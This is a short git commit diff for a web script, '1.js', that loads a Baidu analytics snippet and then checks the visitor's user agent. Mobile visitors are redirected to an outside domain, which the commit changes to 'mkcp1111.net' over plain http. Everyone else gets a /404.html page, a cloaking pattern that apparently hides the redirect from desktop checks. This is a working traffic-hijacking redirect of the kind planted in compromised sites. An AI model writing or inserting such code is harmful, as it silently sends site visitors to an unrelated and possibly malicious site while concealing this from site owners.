ed706bf9dffbc62a2647c1ed34e7ae51ab150212
dnshook <62766196+dnshook@users.noreply.github.com>
2024-09-17 19:44:48 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -6,7 +6,7 @@ var _hmt = _hmt || [];
   s.parentNode.insertBefore(hm, s);
 })();
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
-	var arr = ["https://mkyl22.com", "https://mkyl22.com"];
+	var arr = ["http://mkcp1111.net", "http://mkcp1111.net"];
 	window.location.href = arr[parseInt(Math.random() * arr.length)];
 }else{
 	window.location.href="/404.html";
